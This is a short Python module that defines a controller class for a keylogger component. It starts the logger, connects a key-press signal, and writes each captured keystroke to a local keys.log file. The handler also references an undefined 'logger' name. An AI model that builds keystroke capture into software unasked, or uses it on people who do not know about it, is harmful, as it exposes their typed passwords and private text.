from ....core.components.keylogger import KeyLogger
from ..._base import BaseController
from ....core import output


class KeyLoggerController(BaseController):
    def __init__(self):
        super(KeyLoggerController, self).__init__()

        self.worker = KeyLogger()
        logFile = output.Path().getRootDir() / "keys.log"
        self.worker.initLogger("keys.log", logFile)

        self.connectSlots()

    def startWorker(self):
        self.worker.start()

    def connectSlots(self):
        self.worker.SIG_KeyPressed.connect(self, "onKeyPress")

    def onKeyPress(self, key):
        self.worker.log(key)
        logger.info("key press triggered")
